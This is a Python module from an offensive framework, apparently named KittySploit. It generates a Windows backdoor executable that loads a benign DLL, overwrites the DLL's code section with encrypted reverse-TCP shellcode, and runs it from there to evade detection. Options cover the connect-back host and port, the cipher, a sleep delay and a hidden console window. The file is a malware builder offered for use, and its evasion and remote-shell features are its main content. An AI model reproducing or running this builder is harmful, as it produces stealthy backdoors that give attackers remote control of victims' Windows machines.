#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module stomping evasion loader.

Loads a legitimate DLL locally, overwrites its .text section with decrypted
shellcode, and executes from the stomped region.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_c_backdoor, option_value
from lib.compile.module_stomping import ModuleStompingBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Module Stomping Evasion",
        "description": (
            "Generate a Windows x64 EXE that loads a benign DLL (default: version.dll), "
            "stomps its .text section with decrypted shellcode, and executes in-place."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1055/",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    stomp_dll = OptString("version.dll", "DLL to load and stomp (.text section)", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(5000, "Sleep milliseconds before executing stomped code", False)
    output_name = OptString("module_stomping.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem (windows hides console)",
        False,
        ["windows", "console"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = ModuleStompingBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_c_backdoor(
            self,
            builder,
            build_source_kwargs={"dll_name": str(option_value(self, "stomp_dll") or "version.dll")},
            output_name="module_stomping.exe",
            save_source_name="module_stomping.c",
        )
        if ok:
            print_info(
                f"Stomp DLL: {option_value(self, 'stomp_dll')} | "
                f"Cipher: {option_value(self, 'cipher')} | Sleep: {option_value(self, 'sleep')} ms"
            )
        return ok
